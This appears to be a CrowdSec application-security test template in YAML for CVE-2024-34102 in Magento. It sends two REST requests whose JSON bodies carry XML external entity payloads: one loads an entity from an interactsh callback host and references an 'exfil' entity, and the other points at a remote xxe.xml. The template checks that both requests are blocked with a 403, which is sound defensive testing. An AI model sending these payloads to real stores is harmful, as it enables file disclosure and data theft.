
id: test-CVE-2024-34102
info:
  name: test-CVE-2024-34102
  author: crowdsec
  severity: info
  description: test-CVE-2024-34102 testing
  tags: appsec-testing
http:
  - raw:
    - |
      POST /rest/V1/guest-carts/1/estimate-shipping-methods/2 HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/json

      {"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"<?xml version='1.0' ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM 'http://{{interactsh-url}}'> %sp; %param1; ]> <r>&exfil;</r>","options": 16}}}}}}
    - |
      POST /rest/V1/guest-carts/1/estimate-shipping-methods/3 HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/json

      {"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"http://{{interactsh-url}}/xxe.xml","dataIsURL":true,"options":12345678}}}}}}      
    cookie-reuse: true
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "status_code_1 == 403"
          - "status_code_2 == 403"


